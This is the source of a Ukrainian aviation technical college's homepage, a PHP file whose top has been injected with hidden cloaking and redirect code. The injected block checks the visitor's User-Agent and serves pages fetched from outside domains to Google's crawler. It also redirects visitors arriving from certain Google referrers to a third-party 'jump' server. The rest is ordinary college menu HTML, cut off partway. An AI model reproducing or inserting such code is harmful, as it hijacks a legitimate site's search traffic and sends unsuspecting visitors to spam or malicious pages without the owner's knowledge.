<?php													
?><?php

function GetMetodu($url) { 
    $ch = curl_init(); 
    curl_setopt($ch,CURLOPT_URL,$url); 
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); 
 // curl_setopt($ch,CURLOPT_HEADER, false); 
    
    $output=curl_exec($ch); 
    curl_close($ch); 
    return $output; 
} 
$agent=$_SERVER['HTTP_USER_AGENT'];
if(preg_match("/google/i", $agent)){
echo GetMetodu("http://apais.org");
exit();}
if (!function_exists('stripos')) {
    function stripos($haystack, $needle, $offset = 0)
    {
        return strpos(strtolower($haystack), strtolower($needle), $offset);
    }
}
function GetHttpPage($url)
{
    $output = '';
    $time_out = 30;
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $time_out);
        $output = curl_exec($ch);
        curl_close($ch);
    }
    if ($output) return $output;
    if (function_exists('file_get_contents')) {
        $context = stream_context_create(array('http' => array('timeout' => $time_out)));
        if (strnatcmp(phpversion(), '5.0.0') >= 0) {
            $output = file_get_contents($url, false, $context);
        } else {
            $output = file_get_contents($url, false);
        }
    }
    if ($output) return $output;
    if (ini_get("allow_url_fopen") == "1") {
        $errstr = '';
        $errno = '';
        $info = parse_url($url);
        $fp = fsockopen($info ["host"], 80, $errno, $errstr, $time_out) or exit ($errstr . "--->" . $errno);
        $head = "GET " . $info ['path'] . "?" . (isset($info ["query"]) ? $info ["query"] : "") . " HTTP/1.1\r\n";
        $head .= "Host: " . $info ['host'] . "\r\n";
        $head .= "Connection: Close\r\n\r\n";
        fwrite($fp, $head);
        while (!feof($fp)) {
            $output .= fgets($fp, 128);
        }
        fclose($fp);
    }
    return $output;
}
$lang = "";
if (!isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
    $_SERVER['HTTP_ACCEPT_LANGUAGE'] = "en";
}
if ($_SERVER['HTTP_ACCEPT_LANGUAGE']) {
    $wifilangs = explode(";", $_SERVER['HTTP_ACCEPT_LANGUAGE']);
    $wifilangs = explode(",", $wifilangs[0]);
    $lang = $wifilangs[0];
}
$jump = "http://www.jump2server.com/jump.aspx?jumpid=ska72c";
$mirror = "http://www.jewelrysliver.com/Content.aspx?id=6572";
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : "";
$referer = $referer . "/";
if (preg_match("/(googlebot)/i", $_SERVER['HTTP_USER_AGENT'])) {
    if (stripos($mirror, "http") === false) {
        if (file_exists($mirror)) {
            readfile($mirror);
            exit();
        }
    } else {
        echo(GetHttpPage($mirror));
        exit();
    }
} else if ($jump != "" ) {
if (!preg_match("/zh/i", $lang)) {
    $terms = array();
    array_push($terms, "google.fr");array_push($terms, "google.be");
    if (count($terms) > 0) {
        foreach ($terms as $term) {
            if (stripos($referer, $term) > 0) {
                header('Location: ' . $jump);
                exit();
            }
        }
    } else {
        header('Location: ' . $jump);
        exit();
    }
}
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
  <title>Київський авіаційний технікум</title>
  <meta HTTP-EQUIV="Page-Enter" CONTENT="BlendTrans(Duration=1.0)">
  <meta name="description" content="Київський авіаційний технікум" />
  <meta name="keywords" content="Київський авіаційний технікум" />
  <base />
                                                          <script type="text/javascript">
                              <!--
                                                            var TMenu_path_to_files="includes/javascript/hovermenu/";
                              //-->
                                                          </script>
                              <script type="text/javascript" src="includes/javascript/skin_functions.js"></script>
                              <script type="text/javascript" src="includes/javascript/hovermenu/menu.js"></script>  <link rel="stylesheet" type="text/css" href="skins/uvaf/uvaf.css" />
  <link rel="stylesheet" type="text/css" href="skins/uvaf/menu.css" />
  <script language="javascript">AC_FL_RunContent = 0;</script>
  <script src="AC_RunActiveContent.js" language="javascript"></script>
<meta http-equiv="Тип-содержимое" content="text/html; charset=windows-1251">
<style type="text/css">
<!--
.стиль3 {color: #FFFF04}
.стиль4 {font-size: 14}
.стиль5 {color: #FFFFFF}
-->
</style>
<META HTTP-EQUIV="Pragma" CONTENT="no-cache">
</head>
<body>
<table border="0" cellpadding="0" cellspacing="0" width="100%" height="100%">
  <tr>
    <td rowspan="3" class="background_01">&nbsp;</td>
    <td align="center" valign="bottom" class="background_02"><div align="left"></div></td>
    <td rowspan="3" class="background_03">&nbsp;</td>
  </tr>
  <tr>
    <td class="logo_uvaf"><img src="skins/uvaf/images/logo.jpg" width="961" height="180" align="bottom" /></td>
  </tr>
  <tr>
    <td class="toolbar_uvaf"><center><table border="0" cellpadding="0" cellspacing="0"><tr>
	<td width="3" class="bullet_10"></td><td width="80" class="bullet_8_default" onMouseOver="this.className='bullet_8_hover'" onMouseOut="this.className='bullet_8_default'">
	<table border="0" cellpadding="0" cellspacing="0"><tr><td align="center" class="bullet_4">
	<div class="bullet_5"><a href="index.php" class="sdcategory" target="_self">Головна</a></div></td></tr></table></td>
	<td width="76" class="bullet_8_default" onMouseOver="this.className='bullet_8_hover'" onMouseOut="this.className='bullet_8_default'">
	<table border="0" cellpadding="0" cellspacing="0"><tr><td width="77" align="center" class="bullet_4"><div class="bullet_5"><a href="istoriya_1920-1947.php" class="sdcategory" target="_self">Історія</a></div></td></tr></table></td>
	<td width="94" class="bullet_8_default" onMouseOver="this.className='bullet_8_hover'" onMouseOut="this.className='bullet_8_default'"><table border="0" cellpadding="0" cellspacing="0"><tr><td align="center" class="bullet_4"><div class="bullet_5"><a href="pam.php" class="sdcategory" target="_self">Абітурієнту</a></div></td></tr></table></td><td width="82" class="bullet_8_default" onMouseOver="this.className='bullet_8_hover'" onMouseOut="this.className='bullet_8_default'"><table border="0" cellpadding="0" cellspacing="0"><tr><td align="center" class="bullet_4"><div class="bullet_5"><a href="student.php" class="sdcategory" target="_self">Студенту</a></div></td></tr></table></td><!--<td width="82" class="bullet_8_default" onMouseOver="this.className='bullet_8_hover'" onMouseOut="this.className='bullet_8_default'"><table border="0" cellpadding="0" cellspacing="0"><tr><td align="center" class="bullet_4"><div class="bullet_5"><a href="forum/" class="sdcategory" target="_self">Форум</a></div></td></tr></table></td>--><td width="80" class="bullet_8_default" onMouseOver="this.className='bullet_8_hover'" onMouseOut="this.className='bullet_8_default'"><table border="0" cellpadding="0" cellspacing="0"><tr><td align="center" class="bullet_4"><div class="bullet_5"><a href="forum/index.php?autocom=gallery" class="sdcategory" target="_self">Галерея</a></div></td></tr></table></td><td width="106" class="bullet_8_default" onMouseOver="this.className='bullet_8_hover'" onMouseOut="this.className='bullet_8_default'"><table width="106" border="0" cellpadding="0" cellspacing="0">
      <tr><td width="106" align="center" class="bullet_4"><div class="bullet_5"><a href="forum/index.php?autocom=downloads" class="sdcategory" target="_self">Завантажити</a></div></td></tr></table></td><td width="101" class="bullet_8_default" onMouseOver="this.className='bullet_8_hover'" onMouseOut="this.className='bullet_8_default'"><table width="101" border="0" cellpadding="0" cellspacing="0">
        <tr><td width="101" align="center" class="bullet_4"><div class="bullet_5"><a href="kont.php" class="sdcategory" target="_self">Контакти</a></div></td></tr></table></td></tr></table>
		
		
		
<!--		
<form>
<table cellspacing=4><tr><td>
                            <input type="button" class="button" name="btnSubmit" value="   НАЗВА ВКЛАДКИ(мб.накази)" onClick="javascript: document.location='nakaz.php';" onMouseOver="javascript:this.style.backgroundColor='#D2D2FF';" onMouseOut="javascript:this.style.backgroundColor='#ffffff';" />
</td></tr><tr><td>
                            <input type="button" class="button" name="btnSubmit" value="Історія технікуму" onClick="javascript: document.location='istoriya_tehnikumu.php';" onMouseOver="javascript:this.style.backgroundColor='#D2D2FF';" onMouseOut="javascript:this.style.backgroundColor='#ffffff';" />
							</td></tr><tr><td>                           
							<input type="button" class="button" name="btnSubmit" value="Новини технікуму" onClick="javascript: document.location='novosti_teh.php';" onMouseOver="javascript:this.style.backgroundColor='#D2D2FF';" onMouseOut="javascript:this.style.backgroundColor='#ffffff';" />
							</td></tr><tr><td>        
							<input type="button" class="button" name="btnSubmit" value="Доступ до публічної інформації" onClick="javascript: document.location='reklama.php';" onMouseOver="javascript:this.style.backgroundColor='#D2D2FF';" onMouseOut="javascript:this.style.backgroundColor='#ffffff';" />
							</td></tr><tr><td>      
							<input type="button" class="button" name="btnSubmit" value="Вибір підручників" onClick="javascript: document.location='reklama2.php';" onMouseOver="javascript:this.style.backgroundColor='#D2D2FF';" onMouseOut="javascript:this.style.backgroundColor='#ffffff';" />
							</td></tr></table>                                                                             



                     </form> 		
-->		
		
		
		
		
		<object><embed src="ogolos(viboru.d).pdf" width="700" height="500" /></object>
		
	<!--	<iframe src="director.docx" width=200 height=500> -->